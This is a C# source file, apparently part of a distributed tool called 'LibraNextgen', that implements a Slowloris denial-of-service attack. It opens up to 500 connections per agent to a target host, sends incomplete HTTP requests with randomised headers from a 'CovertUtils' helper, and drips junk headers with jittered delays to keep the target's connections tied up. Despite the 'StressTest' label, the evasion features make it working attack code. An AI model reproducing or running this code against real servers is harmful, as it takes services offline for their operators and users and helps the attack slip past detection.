using System.Net.Sockets;
using System.Text;
using LibraNextgen.Common.Models;

namespace LibraNextgen.Agent.Modules.StressTest;

public class Slowloris : IStressMethod
{
    public string Name => "Slowloris";

    public async Task ExecuteAsync(StressConfig config, IStressReporter rpt, CancellationToken ct)
    {
        var maxConns = Math.Min(config.ThreadsPerAgent, 500);
        var tasks = new List<Task>();

        for (int i = 0; i < maxConns; i++)
            tasks.Add(SlowConn(config, rpt, ct));

        await Task.WhenAll(tasks);
    }

    private async Task SlowConn(StressConfig config, IStressReporter rpt, CancellationToken ct)
    {
        while (!ct.IsCancellationRequested)
        {
            TcpClient? client = null;
            try
            {
                client = new TcpClient();
                await client.ConnectAsync(config.TargetHost, config.TargetPort, ct);

                rpt.IncrementConnections(1);
                var stream = client.GetStream();

                var partial = $"GET {config.HttpPath} HTTP/1.1\r\n" +
                    $"Host: {config.TargetHost}\r\n" +
                    $"User-Agent: {CovertUtils.RandomUserAgent()}\r\n" +
                    $"Accept: text/html,application/xhtml+xml,*/*\r\n" +
                    $"Accept-Language: {CovertUtils.RandomAcceptLanguage()}\r\n" +
                    $"Connection: keep-alive\r\n";

                var hdr = Encoding.ASCII.GetBytes(partial);
                await stream.WriteAsync(hdr, ct);
                rpt.IncrementPackets();
                rpt.IncrementBytes(hdr.Length);

                while (!ct.IsCancellationRequested && client.Connected)
                {
                    await Task.Delay(CovertUtils.RandomJitter(5000, 0.5), ct);
                    var drip = $"X-Random-{Guid.NewGuid():N}: {Guid.NewGuid():N}\r\n";
                    var bytes = Encoding.ASCII.GetBytes(drip);
                    await stream.WriteAsync(bytes, ct);
                    rpt.IncrementBytes(bytes.Length);
                }
            }
            catch { }
            finally
            {
                rpt.IncrementConnections(-1);
                client?.Dispose();
            }
        }
    }
}
